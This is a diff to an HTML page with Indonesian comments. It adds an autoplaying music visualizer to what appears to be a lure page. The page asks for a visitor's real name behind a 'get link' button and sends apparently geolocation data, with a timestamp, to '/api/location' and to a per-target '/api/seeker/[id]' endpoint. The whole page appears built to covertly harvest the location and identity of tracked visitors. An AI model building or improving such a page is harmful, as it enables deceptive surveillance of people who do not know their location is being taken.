@@ -21,6 +21,13 @@
       border: none; 
       cursor: pointer;
     }
+    canvas {
+      width: 100%;
+      height: 150px;
+      background: black;
+      display: block;
+      margin-top: 20px;
+    }
   </style>
 </head>
 <body>
@@ -32,19 +39,52 @@
   <!-- Audio dari GitHub -->
   <audio id="audio" src="https://github.com/mukti-nux/Framer-asset/raw/refs/heads/main/INTERWORLD%20-%20METAMORPHOSIS.mp3" preload="auto"></audio>
 
+  <!-- Canvas untuk visualizer -->
+  <canvas id="canvas" width="600" height="150"></canvas>
+
   <input type="text" id="nama" placeholder="Nama Asli"><br><br>
   <button onclick="submitData()">Dapatkan Link</button>
 
   <script>
     const id = new URLSearchParams(window.location.search).get("id");
 
-    // Mulai audio saat pertama kali disentuh/klik di mana pun
+    // Audio setup
     const audio = document.getElementById('audio');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    const source = audioCtx.createMediaElementSource(audio);
+    const analyser = audioCtx.createAnalyser();
+    source.connect(analyser);
+    analyser.connect(audioCtx.destination);
+    analyser.fftSize = 256;
+    const bufferLength = analyser.frequencyBinCount;
+    const dataArray = new Uint8Array(bufferLength);
+
+    function draw() {
+      requestAnimationFrame(draw);
+      analyser.getByteFrequencyData(dataArray);
+      ctx.fillStyle = '#000';
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+      const barWidth = (canvas.width / bufferLength) * 2.5;
+      let x = 0;
+      for (let i = 0; i < bufferLength; i++) {
+        const barHeight = dataArray[i];
+        ctx.fillStyle = `rgb(${barHeight + 100},50,50)`;
+        ctx.fillRect(x, canvas.height - barHeight, barWidth, barHeight);
+        x += barWidth + 1;
+      }
+    }
+
     function startAudioOnce() {
+      audioCtx.resume(); // penting agar Web Audio bisa jalan di browser modern
       audio.play().catch(err => console.warn("Audio gagal diputar:", err));
+      draw();
       document.removeEventListener('click', startAudioOnce);
       document.removeEventListener('touchstart', startAudioOnce);
     }
+
     document.addEventListener('click', startAudioOnce);
     document.addEventListener('touchstart', startAudioOnce);
 
@@ -64,14 +104,12 @@
               timestamp: new Date().toISOString()
             };
 
-            // Kirim ke /api/location
             fetch("/api/location", {
               method: "POST",
               headers: { "Content-Type": "application/json" },
               body: JSON.stringify(body),
             }).catch((e) => console.warn("Lokasi gagal dikirim:", e));
 
-            // Kirim ke /api/seeker/[id]
             fetch(`/api/seeker/${id}`, {
               method: "POST",
               headers: { "Content-Type": "application/json" },
